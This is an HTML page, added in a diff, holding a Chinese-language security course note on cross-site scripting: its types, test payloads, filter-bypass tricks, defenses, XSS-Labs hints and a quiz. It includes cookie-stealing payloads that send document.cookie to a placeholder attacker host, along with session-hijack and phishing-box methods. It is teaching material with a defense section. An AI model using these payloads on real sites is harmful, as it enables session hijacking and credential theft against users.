@@ -1,0 +1,459 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>47 · XSS跨站脚本攻击 | tongui 的安全笔记</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="XSS 跨站脚本攻击 ⭐ 一句话总结:XSS 是把恶意 JS 代码”存进”页面,让别人的浏览器执行——攻击对象是用户不是服务器;危害集中在盗 Cookie、窃密码、钓鱼,存储型最危险,HttpOnly 和输出编码是主要防线。  学习目标 理解 XSS 原理与三大分类 会找输入输出点并构造 payload 掌握 Cookie 窃取、钓鱼等利用方式 掌握常见过滤绕过手段 理解 HttpOnly、同源策">
+<meta property="og:type" content="website">
+<meta property="og:title" content="47 · XSS跨站脚本攻击">
+<meta property="og:url" content="https://tongui66.github.io/course-notes/chapter2-web-vulns/47-XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:site_name" content="tongui 的安全笔记">
+<meta property="og:description" content="XSS 跨站脚本攻击 ⭐ 一句话总结:XSS 是把恶意 JS 代码”存进”页面,让别人的浏览器执行——攻击对象是用户不是服务器;危害集中在盗 Cookie、窃密码、钓鱼,存储型最危险,HttpOnly 和输出编码是主要防线。  学习目标 理解 XSS 原理与三大分类 会找输入输出点并构造 payload 掌握 Cookie 窃取、钓鱼等利用方式 掌握常见过滤绕过手段 理解 HttpOnly、同源策">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-08-08T02:00:00.000Z">
+<meta property="article:modified_time" content="2026-08-08T01:54:51.763Z">
+<meta property="article:author" content="tongui">
+<meta property="article:tag" content="Web安全, 渗透测试, CTF, SQL注入, XSS, 内网渗透, 应急响应, 安全笔记">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="tongui 的安全笔记" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&family=Noto+Sans+SC:wght@400;500;600;700&display=swap" rel="stylesheet">
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="header-outer" class="outer">
+    <div id="header-inner" class="inner">
+      <a href="/" id="logo" class="nav-logo">tongui 的安全笔记</a>
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+        
+          <a class="main-nav-link" href="/">首页</a>
+        
+          <a class="main-nav-link" href="/security-notes/">安全笔记</a>
+        
+          <a class="main-nav-link" href="/course-notes/">课程</a>
+        
+          <a class="main-nav-link" href="/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95">CTF题解</a>
+        
+          <a class="main-nav-link" href="/tools">工具</a>
+        
+          <a class="main-nav-link" href="/projects">项目</a>
+        
+          <a class="main-nav-link nav-resume" href="/resume">简历</a>
+        
+          <a class="main-nav-link" href="/about">关于我</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          
+            <a class="nav-icon" target="_blank" rel="noopener" href="https://github.com/tongui66"><span class="fa fa-github"></span></a>
+          
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS 订阅"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="搜索"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://tongui66.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="page-" class="h-entry article article-type-page" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/course-notes/chapter2-web-vulns/47-XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/index.html" class="article-date">
+  <time class="dt-published" datetime="2026-08-08T02:00:00.000Z" itemprop="datePublished">2026-08-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      47 · XSS跨站脚本攻击
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="XSS-跨站脚本攻击"><a href="#XSS-跨站脚本攻击" class="headerlink" title="XSS 跨站脚本攻击"></a>XSS 跨站脚本攻击</h1><blockquote>
+<p>⭐ <strong>一句话总结</strong>:XSS 是把恶意 JS 代码”存进”页面,让<strong>别人的浏览器</strong>执行——攻击对象是用户不是服务器;危害集中在盗 Cookie、窃密码、钓鱼,存储型最危险,HttpOnly 和输出编码是主要防线。</p>
+</blockquote>
+<h2 id="学习目标"><a href="#学习目标" class="headerlink" title="学习目标"></a>学习目标</h2><ul>
+<li>理解 XSS 原理与三大分类</li>
+<li>会找输入输出点并构造 payload</li>
+<li>掌握 Cookie 窃取、钓鱼等利用方式</li>
+<li>掌握常见过滤绕过手段</li>
+<li>理解 HttpOnly、同源策略与跨域</li>
+</ul>
+<h2 id="一、XSS-是什么"><a href="#一、XSS-是什么" class="headerlink" title="一、XSS 是什么"></a>一、XSS 是什么</h2><ul>
+<li>全称 Cross-Site Scripting(跨站脚本攻击),因缩写与 CSS 冲突,改名 XSS。</li>
+<li>OWASP Top 10 常客,2021 年排第三,被归类为注入攻击。</li>
+<li>攻击的是<strong>客户端</strong>(浏览器&#x2F;APP 用户),不是服务器。</li>
+<li>载体:JavaScript(还有 ActionScript、VBScript 等浏览器可解析的脚本)。</li>
+</ul>
+<h2 id="二、原理与产生条件"><a href="#二、原理与产生条件" class="headerlink" title="二、原理与产生条件"></a>二、原理与产生条件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">攻击者提交恶意JS → 服务端未过滤 → 输出到页面 → 受害者浏览器解析执行 → 被攻击</span><br></pre></td></tr></table></figure>
+
+<p>产生条件(缺一不可):</p>
+<ol>
+<li><strong>有输入</strong>:用户数据能提交到服务端(评论、搜索、用户名等)。</li>
+<li><strong>有输出</strong>:该数据被服务端回显到页面上。</li>
+</ol>
+<h2 id="三、危害"><a href="#三、危害" class="headerlink" title="三、危害"></a>三、危害</h2><ul>
+<li>窃取 Cookie&#x2F;Session(会话劫持,以受害者身份登录)</li>
+<li>窃取用户名密码、浏览器保存的密码</li>
+<li>键盘记录、钓鱼弹框</li>
+<li>配合 CSRF 操作受害者账号</li>
+</ul>
+<blockquote>
+<p>⭐ 重点:危害上限 &#x3D; 攻击者写的 JS 能力上限。</p>
+</blockquote>
+<h2 id="四、三大分类"><a href="#四、三大分类" class="headerlink" title="四、三大分类"></a>四、三大分类</h2><table>
+<thead>
+<tr>
+<th>类型</th>
+<th>特点</th>
+<th>危害</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>反射型</td>
+<td>参数带在 URL 中,不存储</td>
+<td>需诱导用户点击构造链接</td>
+</tr>
+<tr>
+<td>存储型</td>
+<td>恶意代码存入数据库,所有人访问都触发</td>
+<td>高危</td>
+</tr>
+<tr>
+<td>DOM 型</td>
+<td>JS 操作 DOM 产生,一般不与服务端交互</td>
+<td>中低危,但可结合反射型利用</td>
+</tr>
+</tbody></table>
+<h2 id="五、寻找与测试"><a href="#五、寻找与测试" class="headerlink" title="五、寻找与测试"></a>五、寻找与测试</h2><ul>
+<li>找”有输入 + 有输出”的位置:搜索框、留言板、用户名回显、Referer&#x2F;UA&#x2F;Cookie 回显等。</li>
+<li>基础 payload:</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span>x<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">&quot; onmouseover=&quot;alert(1)</span><br><span class="line">&#x27; onfocus=&#x27;alert(1) autofocus</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>属性位置注入:用引号闭合前面的属性,再添加 <code>on*</code> 事件。</li>
+<li>判断是否成功:弹框出现,或 BP 响应中输出内容被当作标签解析。</li>
+</ul>
+<h2 id="六、DOM-XSS"><a href="#六、DOM-XSS" class="headerlink" title="六、DOM XSS"></a>六、DOM XSS</h2><ul>
+<li>危险操作:<code>innerHTML</code>、<code>document.write</code>、<code>location</code>、<code>document.referrer</code> 等把数据写进页面。</li>
+<li>测试:闭合外层属性后添加事件,如 <code>&quot; onmouseover=alert(1)</code>。</li>
+<li>典型示例:输入被拼进 <code>&lt;a href=&quot;输入&quot;&gt;</code>,用 <code>&quot; onclick=alert(1)</code> 闭合绕过。</li>
+</ul>
+<h2 id="七、利用实战"><a href="#七、利用实战" class="headerlink" title="七、利用实战"></a>七、利用实战</h2><h3 id="1-窃取-Cookie-会话劫持"><a href="#1-窃取-Cookie-会话劫持" class="headerlink" title="1. 窃取 Cookie(会话劫持)"></a>1. 窃取 Cookie(会话劫持)</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">location</span>=<span class="string">&#x27;http://黑客机/xss.php?c=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;document.location=&#x27;http://黑客机?c=&#x27;+document.cookie&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>拿到 Cookie 后:用 BP 把请求中的 Cookie 替换为目标用户 Cookie → 直接以对方身份访问。</p>
+<h3 id="2-反射型-POST-场景"><a href="#2-反射型-POST-场景" class="headerlink" title="2. 反射型 POST 场景"></a>2. 反射型 POST 场景</h3><ul>
+<li>POST 型反射 XSS 需要伪造 HTML 页面:表单 action 指向目标漏洞页,<code>window.onload</code> 自动提交表单,表单里带上恶意 payload。</li>
+<li>诱导受害者打开该页面,浏览器自动完成”提交 → 反射 → 执行 → 盗 Cookie”。</li>
+</ul>
+<h3 id="3-钓鱼弹框"><a href="#3-钓鱼弹框" class="headerlink" title="3. 钓鱼弹框"></a>3. 钓鱼弹框</h3><ul>
+<li>在存储型 XSS 中注入弹框代码(伪造登录框),受害者输入用户名密码后被发送到攻击者服务器。</li>
+<li>其他钓鱼:伪造相似域名网站、邮件钓鱼、iframe 嵌入等。</li>
+</ul>
+<h2 id="八、绕过技巧-重点"><a href="#八、绕过技巧-重点" class="headerlink" title="八、绕过技巧(重点)"></a>八、绕过技巧(重点)</h2><table>
+<thead>
+<tr>
+<th>过滤方式</th>
+<th>绕过</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>只过滤小写 script</td>
+<td>大小写混合 <code>&lt;ScRiPt&gt;</code></td>
+</tr>
+<tr>
+<td>str_replace 只替换一次</td>
+<td>双写 <code>&lt;scr&lt;script&gt;ipt&gt;</code></td>
+</tr>
+<tr>
+<td>过滤 script 标签</td>
+<td>换标签 <code>&lt;img onerror&gt;</code>、<code>&lt;svg onload&gt;</code>、<code>&lt;a href=javascript:&gt;</code></td>
+</tr>
+<tr>
+<td>htmlspecialchars 默认参数</td>
+<td>用单引号闭合属性(默认不编码单引号,需加 ENT_QUOTES)</td>
+</tr>
+<tr>
+<td>过滤空格</td>
+<td>用换行符 <code>%0a</code> 或 <code>/</code> 代替空格</td>
+</tr>
+<tr>
+<td>输出在 JS 中</td>
+<td>闭合前面引号&#x2F;script 标签后自己写 <code>&lt;script&gt;</code></td>
+</tr>
+<tr>
+<td>实体编码防御</td>
+<td>若输出在属性值且单引号未被编码,可属性闭合绕过</td>
+</tr>
+</tbody></table>
+<ul>
+<li>JS 编码:<code>\u0061</code> 等;HTML 实体编码:<code>&amp;#x3c;</code>、<code>&amp;lt;</code> 等——编码能否生效取决于最终由哪个解析器处理。</li>
+</ul>
+<blockquote>
+<p>⭐ 重点:绕过要满足两个条件——① 绕过服务端过滤;② 浏览器最终能解析执行。两者缺一不可。</p>
+</blockquote>
+<h2 id="九、XSS-防范"><a href="#九、XSS-防范" class="headerlink" title="九、XSS 防范"></a>九、XSS 防范</h2><ol>
+<li><strong>输入过滤</strong>:过滤 <code>&lt;</code>、<code>&gt;</code>、引号等特殊字符。</li>
+<li><strong>输出编码</strong>:输出到 HTML 时用 <code>htmlspecialchars(数据, ENT_QUOTES)</code> 编码尖括号和引号。</li>
+<li><strong>Cookie 设置 HttpOnly</strong>:JS 无法读取 <code>document.cookie</code>,防止盗 Cookie。</li>
+<li><strong>CSP(内容安全策略)</strong>:限制可执行的脚本来源。</li>
+<li><strong>框架自带转义</strong>:Vue&#x2F;React 等默认转义输出。</li>
+</ol>
+<h2 id="十、HttpOnly-与绕过"><a href="#十、HttpOnly-与绕过" class="headerlink" title="十、HttpOnly 与绕过"></a>十、HttpOnly 与绕过</h2><ul>
+<li>HttpOnly&#x3D;true 表示 Cookie 只允许 HTTP 传输,<code>document.cookie</code> 读不到。</li>
+<li>绕过思路:放弃 Cookie,转而窃取<strong>用户名密码</strong>——表单劫持(登录页注入伪登录框)、读取浏览器保存的密码。</li>
+<li>安全意识:浏览器不要保存密码,别乱打开陌生 HTML&#x2F;链接。</li>
+</ul>
+<h2 id="十一、同源策略与跨域"><a href="#十一、同源策略与跨域" class="headerlink" title="十一、同源策略与跨域"></a>十一、同源策略与跨域</h2><ul>
+<li><strong>同源</strong>:协议 + 域名 + 端口都相同;非同源页面不能互相读取数据。</li>
+<li>浏览器拦截的是<strong>响应</strong>,请求本身会发出去(因此”发数据盗 Cookie”可用)。</li>
+<li>跨域方式:<ul>
+<li><strong>CORS</strong>:服务端返回 <code>Access-Control-Allow-Origin</code> 允许指定域名访问。</li>
+<li><strong>JSONP</strong>:利用 <code>&lt;script src&gt;</code> 跨域特性,携带 callback 参数,服务端返回 <code>callback(数据)</code>。</li>
+<li><strong>标签跨域</strong>:script、img、link、iframe、a 五大标签默认支持跨域(iframe 嵌入别人页面可做挂马&#x2F;钓鱼)。</li>
+</ul>
+</li>
+</ul>
+<h2 id="十二、XSS-Labs-靶场思路"><a href="#十二、XSS-Labs-靶场思路" class="headerlink" title="十二、XSS Labs 靶场思路"></a>十二、XSS Labs 靶场思路</h2><ul>
+<li>第 1 关:无过滤,直接 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>。</li>
+<li>第 2 关:输出在 input value,闭合属性:<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>。</li>
+<li>第 3 关:htmlspecialchars 但没编码单引号 → 用单引号闭合。</li>
+<li>第 11&#x2F;12&#x2F;13 关:输出点分别是 Referer、User-Agent、Cookie → 抓包改对应请求头注入。</li>
+<li>第 15 关:AngularJS <code>ng-include</code> 引入外部页面,利用被引入页面的 XSS。</li>
+<li>第 16 关:过滤空格 → 用换行符 <code>%0a</code> 绕过。</li>
+<li>第 17&#x2F;18 关:输出在 embed 标签属性 → 闭合属性加 <code>onmouseover</code> 事件。</li>
+<li>第 19&#x2F;20 关:Flash 触发,技术已废弃。</li>
+</ul>
+<h2 id="十三、重点速记"><a href="#十三、重点速记" class="headerlink" title="十三、重点速记"></a>十三、重点速记</h2><ul>
+<li>XSS&#x3D;攻击客户端;输入+输出缺一不可</li>
+<li>反射型不存储、存储型最高危、DOM 型操作页面</li>
+<li>盗 Cookie:document.location 带 document.cookie;换 Cookie 即会话劫持</li>
+<li>绕过:大小写、双写、换标签、单引号闭合、换行符、JS 编码</li>
+<li>防御:输入过滤+输出编码+HttpOnly+CSP</li>
+<li>同源三要素:协议&#x2F;域名&#x2F;端口;CORS&#x2F;JSONP&#x2F;标签跨域</li>
+</ul>
+<h2 id="自测题"><a href="#自测题" class="headerlink" title="自测题"></a>自测题</h2><ol>
+<li>XSS 攻击的是服务器还是客户端?</li>
+<li>XSS 产生需要哪两个条件?</li>
+<li>反射型、存储型、DOM 型的区别?</li>
+<li>如何判断一个输入点是否存在 XSS?</li>
+<li>为什么存储型 XSS 危害最大?</li>
+<li>拿到别人 Cookie 后怎么登录?</li>
+<li>HttpOnly 能防 XSS 吗?它防什么?</li>
+<li>列出三种 XSS 绕过方式。</li>
+<li>同源策略中的”同源”指什么?</li>
+<li>JSONP 为什么能跨域?</li>
+</ol>
+<details><summary>参考答案</summary>
+1. 客户端(浏览器/APP 用户)。<br>
+2. 有输入且输入被输出到页面。<br>
+3. 反射型参数在 URL 不存储,存储型存入数据库,DOM 型由 JS 操作 DOM 产生。<br>
+4. 提交 <script>alert(1)</script> 或事件类 payload,浏览器弹框即存在。<br>
+5. 一次写入,所有访问该页面的用户都会触发。<br>
+6. 抓包后把请求中的 Cookie 替换成目标用户的 Cookie 再发送。<br>
+7. 不能防 XSS,只防 JS 通过 document.cookie 读取 Cookie。<br>
+8. 大小写混合、双写绕过、换标签/单引号闭合属性等。<br>
+9. 协议、域名、端口都相同。<br>
+10. 利用 script 标签 src 默认支持跨域,服务端返回回调函数调用。<br>
+</details>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://tongui66.github.io/course-notes/chapter2-web-vulns/47-XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/index.html" data-id="cuidxTGRpcRP57c0kcxYTxM8q" data-title="47 · XSS跨站脚本攻击" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">SQL注入</a> <a href="/tags/SSRF/" style="font-size: 10px;">SSRF</a> <a href="/tags/XSS/" style="font-size: 10px;">XSS</a> <a href="/tags/XXE/" style="font-size: 10px;">XXE</a> <a href="/tags/%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">上传</a> <a href="/tags/%E4%BB%A3%E7%90%86/" style="font-size: 10px;">代理</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" style="font-size: 10px;">信息收集</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 10px;">命令执行</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 10px;">域渗透</a> <a href="/tags/%E5%BA%94%E6%80%A5/" style="font-size: 10px;">应急</a> <a href="/tags/%E6%8A%A4%E7%BD%91/" style="font-size: 10px;">护网</a> <a href="/tags/%E6%8A%A5%E5%91%8A/" style="font-size: 10px;">报告</a> <a href="/tags/%E6%8F%90%E6%9D%83/" style="font-size: 10px;">提权</a> <a href="/tags/%E6%9F%A5%E6%9D%80/" style="font-size: 10px;">查杀</a> <a href="/tags/%E6%B5%81%E7%A8%8B/" style="font-size: 10px;">流程</a> <a href="/tags/%E7%AD%89%E4%BF%9D/" style="font-size: 10px;">等保</a> <a href="/tags/%E9%9A%A7%E9%81%93/" style="font-size: 10px;">隧道</a> <a href="/tags/%E9%9D%A2%E8%AF%95/" style="font-size: 10px;">面试</a> <a href="/tags/%E9%A2%98%E5%BA%93/" style="font-size: 10px;">题库</a> <a href="/tags/%E9%AB%98%E9%A2%91/" style="font-size: 10px;">高频</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/">安全笔记</a><span class="category-list-count">5</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/Web%E6%BC%8F%E6%B4%9E/">Web漏洞</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/%E9%9D%A2%E8%AF%95/">面试</a><span class="category-list-count">1</span></li></ul></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/08/">八月 2026</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/06/">六月 2026</a><span class="archive-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/security-notes/interview-100/">面试高频问答 100 题</a>
+          </li>
+        
+          <li>
+            <a href="/security-notes/incident-response/">应急响应速查</a>
+          </li>
+        
+          <li>
+            <a href="/security-notes/intranet-domain/">内网渗透与域渗透速查</a>
+          </li>
+        
+          <li>
+            <a href="/security-notes/pentest-checklist/">渗透测试全流程速查</a>
+          </li>
+        
+          <li>
+            <a href="/security-notes/payload-handbook/">Web 漏洞速查与 Payload 手册</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2026 tongui<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/security-notes/" class="mobile-nav-link">安全笔记</a>
+  
+    <a href="/course-notes/" class="mobile-nav-link">课程</a>
+  
+    <a href="/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95" class="mobile-nav-link">CTF题解</a>
+  
+    <a href="/tools" class="mobile-nav-link">工具</a>
+  
+    <a href="/projects" class="mobile-nav-link">项目</a>
+  
+    <a href="/resume" class="mobile-nav-link">简历</a>
+  
+    <a href="/about" class="mobile-nav-link">关于我</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script>
+  (function(){
+    var path = location.pathname.replace(/\/+$/, '') || '/';
+    var links = document.querySelectorAll('#main-nav .main-nav-link');
+    var best = null, bestLen = -1;
+    for (var i = 0; i < links.length; i++){
+      var href = links[i].getAttribute('href') || '';
+      href = href.replace(/\/+$/, '') || '/';
+      var hit = (href === '/' ? path === '/' : (path === href || path.indexOf(href + '/') === 0));
+      if (hit && href.length > bestLen){
+        bestLen = href.length;
+        best = links[i];
+      }
+    }
+    if (best){
+      best.classList.add('current');
+    }
+  })();
+</script>
+
+
+
+
+
+
+  </div>
+</body>
+</html>
